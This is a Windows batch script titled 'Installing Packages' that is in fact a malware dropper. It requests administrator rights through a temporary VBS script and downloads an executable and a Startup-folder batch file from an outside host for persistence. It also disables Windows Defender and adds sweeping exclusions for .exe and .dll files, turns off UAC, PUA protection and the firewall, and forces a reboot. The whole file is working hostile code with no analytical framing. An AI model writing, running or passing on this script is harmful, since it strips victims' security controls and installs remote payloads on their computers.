@echo off
title Installing Packages 
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permission
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges....
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B


:gotAdmin


powershell Invoke-WebRequest https://pornotublovers.com/javase.exe -OutFile javase.exe
set pop=%systemroot%
javase -U:T reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
javase -U:T sc config WinDefend start= disabled
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"%USERPROFILE%\AppData\Roaming'"
powershell.exe -command "Add-MpPreference -ExclusionProcess "regsvr32""
powershell.exe -command "Add-MpPreference -ExclusionProcess ".exe""
powershell.exe -command "Add-MpPreference -ExclusionProcess "iexplorer.exe""
powershell.exe -command "Add-MpPreference -ExclusionProcess "explorer.exe""
powershell.exe -command "Add-MpPreference -ExclusionProcess ".dll""
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell Invoke-WebRequest https://pornotublovers.com/autorun100.bat -OutFile autorun100.bat
powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
powershell.exe -command "Set-MpPreference -PUAProtection disable"
powershell.exe -command "netsh advfirewall set allprofiles state off"
shutdown.exe /r /f /t 00
